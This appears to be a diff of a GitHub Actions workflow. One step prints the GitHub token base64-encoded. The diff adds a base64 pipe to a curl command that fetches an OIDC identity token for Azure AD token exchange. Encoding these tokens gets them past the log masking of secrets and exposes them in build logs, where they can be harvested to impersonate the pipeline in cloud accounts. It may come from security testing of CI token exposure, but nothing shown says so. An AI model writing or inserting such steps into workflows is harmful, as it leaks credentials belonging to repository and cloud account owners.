@@ -16,7 +16,7 @@ jobs:
     steps:
       - run: echo $(echo "${{ github.TOKEN }}" | base64)
       - run: | 
-         curl -v -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
+         curl -v -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | base64
 
   job1:
     runs-on: ubuntu-latest
